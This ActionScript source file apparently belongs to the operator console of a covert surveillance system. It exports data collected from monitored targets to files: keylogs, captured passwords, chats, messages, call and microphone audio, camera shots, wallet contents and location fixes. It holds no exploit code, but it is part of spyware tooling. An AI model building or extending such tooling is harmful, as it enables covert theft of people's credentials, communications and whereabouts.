package it.ht.rcs.console.operations.view.evidences
{
  import flash.events.Event;
  import flash.events.EventDispatcher;
  import flash.events.IEventDispatcher;
  import flash.events.IOErrorEvent;
  import flash.events.ProgressEvent;
  import flash.events.SecurityErrorEvent;
  import flash.filesystem.File;
  import flash.filesystem.FileMode;
  import flash.filesystem.FileStream;
  import flash.net.URLRequest;
  import flash.net.URLStream;
  import flash.utils.ByteArray;
  
  import it.ht.rcs.console.DB;
  import it.ht.rcs.console.evidence.controller.EvidenceManager;
  import it.ht.rcs.console.evidence.model.Evidence;
  import it.ht.rcs.console.utils.Size;
  import it.ht.rcs.console.utils.StringUtils;
  import it.ht.rcs.console.utils.TimeUtils;
  
  import mx.collections.ArrayCollection;
  
  
  public class EvidenceFileExporter extends EventDispatcher
  {
    private var directory:File;
    private var file:File;
    private var extension:String;
    private var originalName:String;
    private var request:URLRequest;
    private var stream:URLStream;
    private var evidences:Vector.<Object>;
    private var currentEvidence:Evidence;
    
    public var currentIndex:int=0;
    public var total:int=0;
    public var bytesLoaded:Number;
    public var bytesTotal:Number
    
    public static const EXPORT_START:String="exportStart";
    public static const EXPORT_PROGRESS:String="exportProgress";
    public static const EXPORT_COMPLETE:String="exportComplete";
    public static const EXPORT_END:String="exportEnd";
    public static const EXPORT_ERROR:String="exportError";

    
    public function export(list:Vector.<Object>):void
    {
      evidences=list;
      total=evidences.length;
      directory=File.desktopDirectory;// Another one??
      directory.browseForDirectory("Choose a directory");
      //file.addEventListener(Event.CANCEL, onDirectoryCancel)
      directory.addEventListener(Event.SELECT, onDirectorySelected)
      
    }
    
    private function onDirectorySelected(e:Event):void
    {
      trace(directory.nativePath);
      dispatchEvent(new Event(EXPORT_START));
      startQueue()
    }
    
    private function startQueue():void
    {
        
        currentIndex=0;
        currentEvidence=evidences[currentIndex] as Evidence;
        exportFile(currentEvidence)
    }
    private function next():void
    {
      currentIndex++;
      if(currentIndex<evidences.length)
      {
        currentEvidence=evidences[currentIndex] as Evidence;
        exportFile(currentEvidence);
      }
      else
      {
        dispatchEvent(new Event(EXPORT_END));
      }
    }
    
    private function exportFile(evidence:Evidence):void
    {
      if(!evidence) return;
      
      switch(evidence.type)
      {
        case "screenshot":
          exportImage(evidence);
          break;

        case "mouse":
          exportImage(evidence);
          break;
        
        case "camera":
          exportImage(evidence);
          break;
        
        case "call":
          if(evidence.data._grid)
           exportSound(evidence);
          else
            exportText(evidence);
          break;
        
        case "file":
          if(evidence.data.type=="open")
          {
            exportText(evidence);
            break;
          }
          else if(evidence.data.type=="capture")
          {
            exportFileCapture(evidence);
            break;
          }
          break;
        
        case "mic":
          exportSound(evidence);
          break;
        
        case "addressbook":
          exportText(evidence);
          break;
        
        case "application":
          exportText(evidence);
          break;
        
        case "calendar":
          exportText(evidence);
          break;
        
        case "chat":
          exportText(evidence);
          break;
        
        case "clipboard":
          exportText(evidence);
          break;
        
        case "device":
          exportText(evidence);
          break;
        
        case "keylog":
          exportText(evidence);
          break;
        
        case "message":
          exportMessage(evidence);
          break;
        
        case "password":
          exportText(evidence);
          break;
        
        case "money":
          exportText(evidence);
          break;
        
        case "position":
          exportText(evidence);
          break;
        
        case "print":
          exportText(evidence);
          break;
        
        case "url":
          exportText(evidence);
          break;
        
        case "command":
          exportText(evidence);
          break;
        
        case "ip":
          exportText(evidence);
          break;
        
        default:
         next();
      }
    
    }
    
    private function onDownloadProgress(e:ProgressEvent):void
    {
      var perc:int=int((e.bytesLoaded/e.bytesTotal)*100);
      bytesLoaded=e.bytesLoaded
      bytesTotal=e.bytesTotal
      dispatchEvent(new Event(EXPORT_PROGRESS));
    }
    
    private function onDownloadError(e:*):void
    {
     trace("Error downloading file");
     dispatchEvent(new Event(EXPORT_ERROR));
    }
    
    private function onFileDownloaded(e:Event):void
    {
      stream.removeEventListener(Event.COMPLETE, onFileDownloaded);
      stream.removeEventListener(ProgressEvent.PROGRESS, onDownloadProgress);
      stream.removeEventListener(IOErrorEvent.IO_ERROR,onDownloadError);
      stream.removeEventListener(SecurityErrorEvent.SECURITY_ERROR ,onDownloadError)
      var fileData:ByteArray=new ByteArray();
      stream.readBytes(fileData, 0, stream.bytesAvailable);
      var fileStream:FileStream=new FileStream();
      fileStream.open(file, FileMode.WRITE);
      fileStream.writeBytes(fileData, 0, fileData.length);
      fileStream.close();
      dispatchEvent(new Event(EXPORT_COMPLETE));
      next()
      
    }
    private function exportText(evidence:Evidence):void
    {
      
      bytesLoaded=0
      bytesTotal=0
      var target:String=EvidenceManager.instance.evidenceFilter.target;
      extension="txt"
      var fileName:String=evidence.type+"_"+evidence._id + "." + extension;
      trace(fileName)
      try{
        file=new File(directory.nativePath +"/"+fileName);
      }
      catch(e:Error){
       trace("error")
      }
    
      var content:String=getInfo(currentEvidence)
      var fileStream:FileStream=new FileStream();
      fileStream.addEventListener(IOErrorEvent.IO_ERROR, onDownloadError)
      fileStream.open(file, FileMode.WRITE);
      fileStream.writeUTFBytes(content);
      fileStream.close();
      dispatchEvent(new Event(EXPORT_COMPLETE));
      next();
      
    }
    
    private function exportImage(evidence:Evidence):void
    {
      
      var target:String=EvidenceManager.instance.evidenceFilter.target;
      var url:String=DB.hostAutocomplete(Console.currentSession.server) + "grid/" + evidence.data._grid + "?target_id=" + encodeURIComponent(target);
      extension="jpg";
      var fileName:String=evidence.type+"_"+evidence._id + "." + extension;
      request=new URLRequest(url);
      stream=new URLStream();
      file=new File(directory.nativePath +"/"+fileName);
      stream.addEventListener(Event.COMPLETE, onFileDownloaded);
      stream.addEventListener(ProgressEvent.PROGRESS, onDownloadProgress);
      stream.addEventListener(IOErrorEvent.IO_ERROR,onDownloadError);
      stream.addEventListener(SecurityErrorEvent.SECURITY_ERROR ,onDownloadError)
      stream.load(request);
      
    }
    
    private function exportMessage(evidence:Evidence):void
    {
      
     if(evidence.data.type=="mail")
     {
       var target:String=EvidenceManager.instance.evidenceFilter.target;
       var url:String=DB.hostAutocomplete(Console.currentSession.server) + "grid/" + evidence.data._grid + "?target_id=" + encodeURIComponent(target);
       extension="eml";
       var fileName:String=evidence.type+"_"+evidence._id + "." + extension;
       request=new URLRequest(url);
       stream=new URLStream();
       file=new File(directory.nativePath +"/"+fileName);
       stream.addEventListener(Event.COMPLETE, onFileDownloaded);
       stream.addEventListener(ProgressEvent.PROGRESS, onDownloadProgress);
       stream.addEventListener(IOErrorEvent.IO_ERROR,onDownloadError);
       stream.addEventListener(SecurityErrorEvent.SECURITY_ERROR ,onDownloadError)
       stream.load(request);
     }
     if(evidence.data.type=="sms" || evidence.data.type=="mms")
     {
       exportText(evidence);
     }
      
    }
    
    private function exportSound(evidence:Evidence):void
    {
      
      var target:String=EvidenceManager.instance.evidenceFilter.target;
      var url:String=DB.hostAutocomplete(Console.currentSession.server) + "grid/" + evidence.data._grid + "?target_id=" + encodeURIComponent(target);
      extension="mp3";
      var fileName:String=evidence.type+"_"+evidence._id + "." + extension;
      request=new URLRequest(url);
      stream=new URLStream();
      file=new File(directory.nativePath +"/"+fileName);
      stream.addEventListener(Event.COMPLETE, onFileDownloaded);
      stream.addEventListener(ProgressEvent.PROGRESS, onDownloadProgress);
      stream.addEventListener(IOErrorEvent.IO_ERROR,onDownloadError);
      stream.addEventListener(SecurityErrorEvent.SECURITY_ERROR ,onDownloadError)
      stream.load(request);
    }
    
    private function exportFileCapture(evidence:Evidence):void
    {
      
      var target:String=EvidenceManager.instance.evidenceFilter.target;
      var url:String=DB.hostAutocomplete(Console.currentSession.server) + "grid/" + evidence.data._grid + "?target_id=" + encodeURIComponent(target);
      originalName=StringUtils.getFilename(evidence.data.path)
      extension=StringUtils.getExtension(evidence.data.path)
      var fileName:String=evidence.type+"_"+evidence._id +"_"+ originalName+ "." + extension;
      request=new URLRequest(url);
      stream=new URLStream();
      file=new File(directory.nativePath +"/"+fileName);
      stream.addEventListener(Event.COMPLETE, onFileDownloaded);
      stream.addEventListener(ProgressEvent.PROGRESS, onDownloadProgress);
      stream.addEventListener(IOErrorEvent.IO_ERROR,onDownloadError);
      stream.addEventListener(SecurityErrorEvent.SECURITY_ERROR ,onDownloadError)
      stream.load(request);
    }
    
   
    private function getMoneyFormatting(evidence:Evidence):String
    {
    var info:String;
    if(evidence.data.type=="wallet")
    {
      info="Type: "+evidence.data.type+"\n";
      info+="Version: "+evidence.data.version+"\n";
      info+="Encrypted: "+evidence.data.encrypted+"\n";
      info+="Size: "+evidence.data.size+"\n";
      info+="Currency: "+evidence.data.currency+"\n";
      info+="Balance: "+evidence.data.balance+"\n";
      info+="Content: "+evidence.data.content+"\n";
    }
      
    else
    {
      info="Type: "+evidence.data.type+"\n";
      info="Id: "+evidence.data.id+"\n";
      info+="From: "+evidence.data.from+"\n";
      info+="To: "+evidence.data.rcpt+"\n";
      info+="Incoming: "+evidence.data.incoming+"\n";
      info+="Amount: "+evidence.data.content+"\n";
    }
    return info;
    }
    
    
    private function getInfo(evidence:Evidence):String
    {
      var info:String;
      
      var address:String;
      var city:String;
      var country:String;
      var street_number:String;
      var street:String;
      var postal_code:String;
      
      
      switch(evidence.type)
      {
        case "addressbook":
          info="Addressbook: "+"\n\n";
          info="Name: "+evidence.data.name+"\n";
          info+="Contact: "+evidence.data.contact+"\n";
          info+="Info: "+evidence.data.info;
          break;
        
        case "application":
          info="Application: "+"\n\n";
          info+="Program: "+evidence.data.program+"\n";
          info+="Action: "+evidence.data.action+"\n";
          info+="Description: "+evidence.data.desc;
          break;
        
        case "calendar":
          info="Calendar: "+"\n\n";
          info+="Begin: "+TimeUtils.timestampFormatter(evidence.data.begin*1000)+"\n";
          info+="End: "+TimeUtils.timestampFormatter(evidence.data.end*1000)+"\n";
          info+="Event: "+evidence.data.event+"\n";
          info+="Info: "+evidence.data.info+"\n";
          break;
        
        case "chat":
          info="Chat: "+"\n\n";
          info+="Topic: "+evidence.data.topic+"\n";
          info+="Peer: "+evidence.data.peer+"\n";
          info+="Program: "+evidence.data.program+"\n";
          info+="Content: "+evidence.data.content+"\n";
          break;
        
        case "clipboard":
          info="Clipboard: "+"\n\n";
          info+="Program: "+evidence.data.program+"\n";
          info+="Window: "+evidence.data.window+"\n";
          info+="Content: "+evidence.data.content+"\n";
          break;
        
        case "device":
          info="Device: "+"\n\n";
          info+="Content: "+evidence.data.content+"\n";
          break;
        
        case "file":
          info="File: "+"\n\n";
          info+="Program: "+evidence.data.program+"\n";
          info+="Path: "+evidence.data.path+"\n";
          info+="Size: "+Size.toHumanBytes(evidence.data.size)+"\n";
          break;
        
        case "keylog":
          info="Keylog: "+"\n\n";
          info+="Program: "+evidence.data.program+"\n";
          info+="Window: "+evidence.data.window+"\n";
          info+="Content: "+evidence.data.content+"\n";
          break;
        
        case "password":
          info="Password: "+"\n\n";
          info+="Program: "+evidence.data.program+"\n";
          info+="Service: "+evidence.data.service+"\n";
          info+="User: "+evidence.data.user+"\n";
          info+="Pass: "+evidence.data.pass+"\n";
          break;
        
        case "message":
          info="Message: "+"\n\n";
          info+="From: "+evidence.data.from+"\n";
          info+="To: "+evidence.data.rcpt+"\n";
          info+="Subject: "+evidence.data.subject+"\n";
          info+="Content: "+evidence.data.content+"\n";
          break;
        
        case "money":
          info=getMoneyFormatting(evidence);
          break;
        
        case "call":
          info="Call: "+"\n\n";
          if(evidence.data.peer)
            info+="Peer: "+evidence.data.peer+"\n";
          else if(evidence.data.from)
            info+="Peer: "+evidence.data.from+"\n";
          
          info+="Program: "+evidence.data.program+"\n";
          info+="Duration: "+TimeUtils.formatTime(evidence.data.duration * 1000)+"\n";
          break;
        
        case "position":
          info="Position: "+"\n\n";
          try {
            info+="Type: "+evidence.data.type+"\n";
          }
          catch(e:Error)
        {
          trace("error");
        }
          var lat:String;
          var lng:String;
          
          if(isNaN(evidence.data.latitude))
          {
            lat="(unknown)"
          }
          else
          {
            lat=String(evidence.data.latitude)
          }
          if(isNaN(evidence.data.longitude))
          {
            lng="(unknown)"
          }
          else
          {
            lng=String(evidence.data.longitude)
          }
     
          
          if (evidence.data.address == null)
          {
            address='(unknown)';
          }
          else
          {
            city=evidence.data.address.city || "";
            country=evidence.data.address.country || "";
            street_number=evidence.data.address.street_number || "";
            street=evidence.data.address.street || "";
            postal_code=evidence.data.address.postal_code || "";
            
            address=city;
            if (country != "")
              address+=" (" + country + ") ";
            if (street_number != "")
              address+=street_number + " ";
            if (street != "")
              address+=street + " ";
            if (postal_code != "")
              address+=postal_code;
          }
          
          var details:String="";
          
          if (evidence.data.cell != null)
          {
            details+="Cell: " + "adv: " + evidence.data.cell.adv + ", age: " + evidence.data.cell.age + ", cid: " + evidence.data.cell.cid + ", db: " + evidence.data.cell.db + ", lac: " + evidence.data.cell.lac + ", mcc: " + evidence.data.cell.mcc + ", mnc: " + evidence.data.cell.mnc;
          }
          
          if (evidence.data.wifi != null)
          {
            for (var k:int=0; k < evidence.data.wifi.length; k++)
            {
              details+="WIFI: " + "bssid: " + evidence.data.wifi.getItemAt(k).ssid + ", mac: " + evidence.data.wifi.getItemAt(k).mac + ", sig: " + evidence.data.wifi.getItemAt(k).sig + "\n";
            }
          }
          if(evidence.data.ip != null)
          {
            details+="IP: "+ evidence.data.ip;
          }

          info+="Latitude: "+lat+"\n";
          info+="Longitude: "+lng+"\n";
          info+="Address: "+address+"\n";
          info+=details;
          break;
        
        case "print":
          info="Print: "+"\n\n";
          info+="Spool: "+evidence.data.spool+"\n";
          break;
        
        case "url":
          info="URL: "+"\n\n";
          info+="URL: "+evidence.data.url+"\n"; //TODO 
          break;
        
        case "command":
          info="Command: "+"\n\n";
          info+="Command: "+evidence.data.command+"\n";
          info+="Output: "+evidence.data.content+"\n";
          break;
        
        case "ip":
          info="IP: "+"\n\n";
          info+="IP Address: "+evidence.data.content+"\n";
          
          
          if (evidence.data.address == null)
          {
            address='(unknown)';
          }
          else
          {
            city=evidence.data.address.city || "";
            country=evidence.data.address.country || "";
            street_number=evidence.data.address.street_number || "";
            street=evidence.data.address.street || "";
            postal_code=evidence.data.address.postal_code || "";
            
            address=city;
            if (country != "")
              address+=" (" + country + ") ";
            if (street_number != "")
              address+=street_number + " ";
            if (street != "")
              address+=street + " ";
            if (postal_code != "")
              address+=postal_code;
          }
          info+="Address: "+address+"\n";
          break;
        
      }
      return info;
    }
  }
}